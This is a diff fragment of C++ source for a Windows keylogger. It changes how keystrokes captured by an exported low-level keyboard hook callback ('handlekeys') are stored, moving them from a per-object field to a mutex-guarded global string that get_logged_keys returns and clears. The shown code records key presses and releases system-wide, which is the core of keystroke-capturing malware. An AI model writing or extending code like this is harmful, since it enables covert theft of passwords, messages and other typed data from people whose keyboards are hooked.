@@ -10,6 +10,8 @@ Keylogger* keylogger = NULL;
 std::mutex keylogger_lock;
 bool thread_active = false;
 
+std::string logged_keys_global = "";
+
 Keylogger::Keylogger()
 {
     this->logged_keys = "";
@@ -112,8 +114,8 @@ std::string Keylogger::get_logged_keys()
 		return "";
 	}
 
-	std::string output = this->logged_keys;
-	this->logged_keys = "";
+	std::string output = logged_keys_global;
+	logged_keys_global = "";
 
 	keylogger_lock.unlock();
 
@@ -125,7 +127,7 @@ __declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp
 	/*
 	* source: https://cplusplus.com/forum/lounge/27569/
 	*/
-
+	
 	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
 		char tmp[0xFF] = { 0 };
 		std::string str;
@@ -179,9 +181,10 @@ __declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp
 		keylogger_lock.lock();
 
 		if (keylogger != NULL)
-			keylogger->logged_keys += str;
+			logged_keys_global += str;
 
 		keylogger_lock.unlock();
+		
 	}
 	else if (code == HC_ACTION && (wp == WM_SYSKEYUP || wp == WM_KEYUP))
 	{
@@ -222,7 +225,7 @@ __declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp
 				str = ("@release[" + str + "]");
 
 				if (keylogger != NULL)
-					keylogger->logged_keys += str;
+					logged_keys_global += str;
 			}
 		}
 	}
